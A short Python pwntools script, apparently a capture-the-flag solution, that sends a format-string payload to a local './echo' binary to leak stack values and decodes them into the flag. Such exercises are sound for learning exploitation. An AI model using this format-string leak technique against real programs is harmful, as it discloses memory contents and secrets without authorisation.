from pwn import *


def hex_chunks_to_string(hex_chunks: bytes) -> str:

    text = hex_chunks.decode('ascii')
    chunks = text.split()
    result_bytes = bytearray()
    
    for chunk in chunks:
    
        hex_part = chunk[2:]
        
        value = int(hex_part, 16)
        
        num_bytes = (len(hex_part) + 1) // 2
        
        result_bytes += value.to_bytes(num_bytes, byteorder='little')
        
    return result_bytes.decode('ascii')

target = process("./echo")
target.recvuntil(b">")
target.sendline(b"%27$p %28$p %29$p %30$p")
flag = target.recvuntil(b">")


print(hex_chunks_to_string(flag[1:-2]))
